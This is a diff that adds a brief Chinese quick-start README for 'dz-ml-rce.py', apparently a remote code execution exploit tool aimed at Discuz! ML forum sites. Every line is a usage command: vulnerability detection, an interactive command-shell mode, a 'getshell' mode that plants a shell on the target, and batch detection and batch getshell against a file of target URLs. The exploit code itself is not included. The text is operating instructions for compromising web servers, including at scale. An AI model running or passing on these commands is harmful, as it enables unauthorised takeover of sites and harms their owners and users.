@@ -1,0 +1,19 @@
+# 快速开始
+
+使用帮助
+python dz-ml-rce.py -h
+
+判断模式
+python dz-ml-rce.py -u "http://www.xxx.cn/forum.php"
+
+cmdshell模式
+python dz-ml-rce.py -u "http://www.xxx.cn/forum.php" --cmdshell
+
+getshell模式
+python dz-ml-rce.py -u "http://www.xxx.cn/forum.php" --getshell
+
+批量检测
+python dz-ml-rce.py -f urls.txt
+
+批量getshell
+python dz-ml-rce.py -f urls.txt --getshell
